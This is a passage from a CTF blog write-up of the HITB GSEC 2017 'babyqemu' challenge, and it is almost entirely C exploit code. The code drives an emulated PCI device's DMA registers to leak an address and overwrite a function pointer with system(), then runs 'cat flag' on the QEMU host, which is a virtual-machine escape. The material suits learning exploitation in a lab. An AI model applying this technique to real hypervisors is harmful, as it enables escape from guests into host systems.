</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=o>*</span><span class=p>((</span><span class=kt>uint64_t</span> <span class=o>*</span><span class=p>)(</span><span class=n>iomem</span> <span class=o>+</span> <span class=n>addr</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>dma_setsrc</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>src</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>iowrite</span><span class=p>(</span><span class=mh>0x80</span><span class=p>,</span> <span class=n>src</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>dma_setdst</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>dst</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>iowrite</span><span class=p>(</span><span class=mh>0x88</span><span class=p>,</span> <span class=n>dst</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>dma_setcnt</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>cnt</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>iowrite</span><span class=p>(</span><span class=mh>0x90</span><span class=p>,</span> <span class=n>cnt</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>dma_setcmd</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>cmd</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>iowrite</span><span class=p>(</span><span class=mh>0x98</span><span class=p>,</span> <span class=n>cmd</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>dma_read</span><span class=p>(</span><span class=kt>uint64_t</span> <span class=n>addr</span><span class=p>,</span> <span class=kt>size_t</span> <span class=n>len</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>dma_setsrc</span><span class=p>(</span><span class=n>addr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>dma_setdst</span><span class=p>(</span><span class=n>dmabuf_phys_addr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>dma_setcnt</span><span class=p>(</span><span class=n>len</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>dma_setcmd</span><span class=p>(</span><span class=mh>0x3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>dma_write</span><span class=p>(</span><span class=kt>uint64_t</span> <span class=n>addr</span><span class=p>,</span> <span class=kt>void</span> <span class=o>*</span><span class=n>buf</span><span class=p>,</span> <span class=kt>size_t</span> <span class=n>len</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>memcpy</span><span class=p>(</span><span class=n>dmabuf</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=n>len</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>dma_setsrc</span><span class=p>(</span><span class=n>dmabuf_phys_addr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>dma_setdst</span><span class=p>(</span><span class=n>addr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>dma_setcnt</span><span class=p>(</span><span class=n>len</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>dma_setcmd</span><span class=p>(</span><span class=mh>0x1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>dma_enc_read</span><span class=p>(</span><span class=kt>uint64_t</span> <span class=n>addr</span><span class=p>,</span> <span class=kt>size_t</span> <span class=n>len</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>dma_setsrc</span><span class=p>(</span><span class=n>addr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>dma_setdst</span><span class=p>(</span><span class=n>dmabuf_phys_addr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>dma_setcnt</span><span class=p>(</span><span class=n>len</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>dma_setcmd</span><span class=p>(</span><span class=mh>0x7</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>argv</span><span class=p>[])</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=s>&#34;/sys/devices/pci0000:00/0000:00:04.0/resource0&#34;</span><span class=p>,</span> <span class=n>O_RDWR</span><span class=o>|</span><span class=n>O_SYNC</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>fd</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>die</span><span class=p>(</span><span class=s>&#34;open&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>iomem</span> <span class=o>=</span> <span class=nf>mmap</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x1000</span><span class=p>,</span> <span class=n>PROT_READ</span><span class=o>|</span><span class=n>PROT_WRITE</span><span class=p>,</span> <span class=n>MAP_SHARED</span><span class=p>,</span> <span class=n>fd</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>iomem</span> <span class=o>==</span> <span class=n>MAP_FAILED</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>die</span><span class=p>(</span><span class=s>&#34;mmap&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;iomem          @ %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>iomem</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>dmabuf</span> <span class=o>=</span> <span class=nf>mmap</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x1000</span><span class=p>,</span> <span class=n>PROT_READ</span><span class=o>|</span><span class=n>PROT_WRITE</span><span class=p>,</span> <span class=n>MAP_SHARED</span><span class=o>|</span><span class=n>MAP_ANONYMOUS</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>dmabuf</span> <span class=o>==</span> <span class=n>MAP_FAILED</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>die</span><span class=p>(</span><span class=s>&#34;mmap2&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// lock part or all of the calling process&#39;s virtual address space
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// into RAM, preventing that memory from being paged to the swap area.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>mlock</span><span class=p>(</span><span class=n>dmabuf</span><span class=p>,</span> <span class=mh>0x1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>dmabuf_phys_addr</span> <span class=o>=</span> <span class=nf>virt2phys</span><span class=p>(</span><span class=n>dmabuf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;dmabuff        @ %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>dmabuf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;dmabuff(phys)  @ %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=n>dmabuf_phys_addr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// leak hitb_enc address
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>dma_read</span><span class=p>(</span><span class=n>DMA_BASE</span><span class=o>+</span><span class=mh>0x1000</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>hitb_enc</span> <span class=o>=</span> <span class=o>*</span><span class=p>((</span><span class=kt>uint64_t</span> <span class=o>*</span><span class=p>)</span><span class=n>dmabuf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// calculate the system plt.got address
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>uint64_t</span> <span class=n>elf_base</span>      <span class=o>=</span> <span class=n>hitb_enc</span> <span class=o>-</span> <span class=mh>0x283DD0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>system_pltgot</span> <span class=o>=</span> <span class=n>elf_base</span> <span class=o>+</span> <span class=mh>0x1FDB18</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;system@plt.got @ 0x%lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>system_pltgot</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>dma_write</span><span class=p>(</span><span class=n>DMA_BASE</span><span class=o>+</span><span class=mh>0x1000</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>system_pltgot</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=o>*</span><span class=n>payload</span> <span class=o>=</span> <span class=s>&#34;cat flag&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>dma_write</span><span class=p>(</span><span class=n>DMA_BASE</span><span class=o>+</span><span class=mh>0x100</span><span class=p>,</span> <span class=n>payload</span><span class=p>,</span> <span class=nf>strlen</span><span class=p>(</span><span class=n>payload</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>dma_enc_read</span><span class=p>(</span><span class=n>DMA_BASE</span><span class=o>+</span><span class=mh>0x100</span><span class=p>,</span> <span class=mh>0x4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=参考>参考<a hidden class=anchor aria-hidden=true href=#参考>#</a></h2><ol><li><a href=https://kitctf.de/writeups/hitb2017/babyqemu>HITB GSEC 2017: babyqemu</a></li><li>[Sakura_University/外卡赛/HITB GSEC 2017 at master · tina2114/Sakura_University ](<a href=https://github.com/tina2114/Sakura_University/tree/master/>https://github.com/tina2114/Sakura_University/tree/master/</a>外卡赛/HITB GSEC 2017) zhz师傅tql</li></ol></div><footer class=post-footer><ul class=post-tags><li><a href=https://hhdx.xyz/tags/qemu/>Qemu</a></li><li><a href=https://hhdx.xyz/tags/ctf/>CTF</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://hhdx.xyz/>hhdx's blog</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>